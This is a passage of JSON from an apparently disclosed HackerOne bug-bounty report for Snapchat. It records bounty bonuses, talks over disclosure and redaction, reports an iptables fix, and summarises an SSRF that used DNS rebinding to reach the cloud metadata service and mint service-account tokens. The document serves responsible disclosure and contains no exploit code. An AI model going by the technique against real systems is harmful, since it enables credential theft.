didn\u0026#39;t have significant permissions beyond the prod instance (the dev project itself), but crucially had access to a set of internal test credentials. There will be an additional bounty, but the amount will depend on what those credentials had access to. Finding that set of services is what\u0026#39;s taking so long right now.\u003c/p\u003e\n\n\u003cp\u003eThanks for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-04T22:59:21.878Z","updated_at":"2019-06-04T22:59:21.878Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5010916,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @nahamsec as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\n\nThanks and good luck in your future bug hunting.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\u003c/p\u003e\n\n\u003cp\u003eThanks and good luck in your future bug hunting.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T22:59:09.573Z","updated_at":"2019-06-05T22:59:09.573Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"250.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"nahamsec","url":"/nahamsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5010917,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @nahamsec as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\n\nThanks and good luck in your future bug hunting.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\u003c/p\u003e\n\n\u003cp\u003eThanks and good luck in your future bug hunting.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T22:59:10.296Z","updated_at":"2019-06-05T22:59:10.296Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"100.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"ziot","url":"/ziot"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5010918,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @nahamsec as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\n\nThanks and good luck in your future bug hunting.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e as discussed we are providing an additional bonus as the dev instance had access to the internal test credentials. Upon further investigation we concluded that the credentials had access to some internal dashboards, but nothing critical.\u003c/p\u003e\n\n\u003cp\u003eThanks and good luck in your future bug hunting.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T22:59:10.891Z","updated_at":"2019-06-05T22:59:10.891Z","actor":{"url":"/snapchat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/513/87067c5c4ed63c2c07a522ca3198d2310e2a14c6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Snapchat"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"150.0","genius_execution_id":null,"team_handle":"snapchat","collaborator":{"username":"daeken","url":"/daeken"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5010943,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! Since this is fixed, do you mind if I publish a write up on this? I don't really care for publishing this report itself since it has some sensitive data in it. But wanted to make sure you are okay with the blog post? \n\nIs this okay to share? ███","markdown_message":"\u003cp\u003eThanks! Since this is fixed, do you mind if I publish a write up on this? I don\u0026#39;t really care for publishing this report itself since it has some sensitive data in it. But wanted to make sure you are okay with the blog post? \u003c/p\u003e\n\n\u003cp\u003eIs this okay to share? ███\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T23:07:35.994Z","updated_at":"2020-11-04T10:57:39.093Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5020197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @michael_xu - Just giving this a gentle bump","markdown_message":"\u003cp\u003eHey \u003ca href=\"/michael_xu\"\u003e@michael_xu\u003c/a\u003e - Just giving this a gentle bump\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-06T22:39:09.565Z","updated_at":"2019-06-06T22:39:09.565Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5020231,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nahamsec - that call is above my pay grade, let me check with the appropriate folks.","markdown_message":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e - that call is above my pay grade, let me check with the appropriate folks.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-06T22:51:37.437Z","updated_at":"2019-06-06T22:51:37.437Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5056743,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @michael_xu - Any luck with this? we'd love to close this out and disclose it (and adjust anything as you see fit) but I'd love to see a written approval from your team before we do anything. We also have a general blog around BXSS on Jupyter that mentions your org along with other companies. Both write ups are mostly focused around the technical aspect of the submission rather than the companies we have reported the bugs to. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/michael_xu\"\u003e@michael_xu\u003c/a\u003e - Any luck with this? we\u0026#39;d love to close this out and disclose it (and adjust anything as you see fit) but I\u0026#39;d love to see a written approval from your team before we do anything. We also have a general blog around BXSS on Jupyter that mentions your org along with other companies. Both write ups are mostly focused around the technical aspect of the submission rather than the companies we have reported the bugs to. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-11T20:15:01.447Z","updated_at":"2019-06-11T20:15:01.447Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5056999,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @nahamsec - I talked with some folks and they're open to letting you publish a blog post/video about the exploit. However, we'll need to leave out any personal info. In the linked youtube video, a Snap developer's name is printed out as part of the instance metadata. Could you edit the video to redact those personal details?\n\nAlso out of respect for the team who owns the system, could you also redact the service accounts project id's and the hostname? We'll be giving them a heads up too so they don't just stumble upon their service in a youtube video :)","markdown_message":"\u003cp\u003eHey \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e - I talked with some folks and they\u0026#39;re open to letting you publish a blog post/video about the exploit. However, we\u0026#39;ll need to leave out any personal info. In the linked youtube video, a Snap developer\u0026#39;s name is printed out as part of the instance metadata. Could you edit the video to redact those personal details?\u003c/p\u003e\n\n\u003cp\u003eAlso out of respect for the team who owns the system, could you also redact the service accounts project id\u0026#39;s and the hostname? We\u0026#39;ll be giving them a heads up too so they don\u0026#39;t just stumble upon their service in a youtube video :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-11T20:25:10.014Z","updated_at":"2019-06-11T20:25:10.014Z","actor":{"username":"michael_xu","cleared":false,"url":"/michael_xu","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5057049,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"of course! We don't want to make anyone feel uncomfortable. I know public disclosure can become a bit uncomfortable so we want to make sure we do this so it's beneficial and comfortable for both parties (hacker and program owners). Thanks again, I appreciate you being so quick to respond, staying transparent and helping us out with all of our submissions. I *really* appreciate that! ","markdown_message":"\u003cp\u003eof course! We don\u0026#39;t want to make anyone feel uncomfortable. I know public disclosure can become a bit uncomfortable so we want to make sure we do this so it\u0026#39;s beneficial and comfortable for both parties (hacker and program owners). Thanks again, I appreciate you being so quick to respond, staying transparent and helping us out with all of our submissions. I \u003cem\u003ereally\u003c/em\u003e appreciate that! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-11T20:33:43.731Z","updated_at":"2019-06-11T20:33:43.731Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5336559,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @nahamsec, @daeken, we rolled out the fix that applies iptables rules to block requests to metadata services. Please feel free to reach out to us again if this is not satisfactory, and we'll reopen this. Thanks again for reporting to us! ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e, we rolled out the fix that applies iptables rules to block requests to metadata services. Please feel free to reach out to us again if this is not satisfactory, and we\u0026#39;ll reopen this. Thanks again for reporting to us! \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-16T17:50:30.210Z","updated_at":"2019-07-16T17:50:30.210Z","actor":{"username":"ktr-sc","cleared":false,"url":"/ktr-sc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/507/075/cd7ba5e66f36d6250448ebdad37124aa93623111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"nahamsec","url":"/nahamsec"},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9962094,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @nahamsec, @daeken, thank you again for your participation in our BugBounty program!\nWould you be ok with a full disclosure of this report? I've already redacted the access tokens and hostnames, but please let us know if there is something else which should be redacted within this report.\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e, thank you again for your participation in our BugBounty program!\u003cbr\u003e\nWould you be ok with a full disclosure of this report? I\u0026#39;ve already redacted the access tokens and hostnames, but please let us know if there is something else which should be redacted within this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-30T13:37:24.621Z","updated_at":"2020-11-30T13:37:24.621Z","first_to_agree":true,"actor":{"username":"apfeifer_sc","cleared":false,"url":"/apfeifer_sc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9965467,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks again!","markdown_message":"\u003cp\u003eThanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-30T18:27:26.454Z","updated_at":"2020-11-30T18:27:26.454Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9965469,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-30T18:27:26.526Z","updated_at":"2020-11-30T18:27:26.526Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9965473,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Edit: thanks! \u003c3","markdown_message":"\u003cp\u003eEdit: thanks! \u0026lt;3\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-30T18:28:02.732Z","updated_at":"2020-11-30T18:30:47.389Z","actor":{"username":"ziot","cleared":true,"url":"/ziot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/262/0ae404c47a4859c97158707b8e111baf9f6193d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"snapchat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":25257,"category":"team","content":"@nahamsec, @daeken and @ziot found a Server-Side Request Forgery (SSRF) vulnerability in https://business.snapchat.com which they exploit by providing a custom webpage configured to utilize DNS rebinding to access internal web endpoints like the Google Metadata Service. Using this they are able to mint tokens for the service-account assigned to the instance hosting the Chrome instances used for extracting webpages assets for media projects.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e, \u003ca href=\"/daeken\"\u003e@daeken\u003c/a\u003e and \u003ca href=\"/ziot\"\u003e@ziot\u003c/a\u003e found a Server-Side Request Forgery (SSRF) vulnerability in \u003ca title=\"https://business.snapchat.com\" href=\"/redirect?url=https%3A%2F%2Fbusiness.snapchat.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://business.snapchat.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which they exploit by providing a custom webpage configured to utilize DNS rebinding to access internal web endpoints like the Google Metadata Service. Using this they are able to mint tokens for the service-account assigned to the instance hosting the Chrome instances used for extracting webpages assets for media projects.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}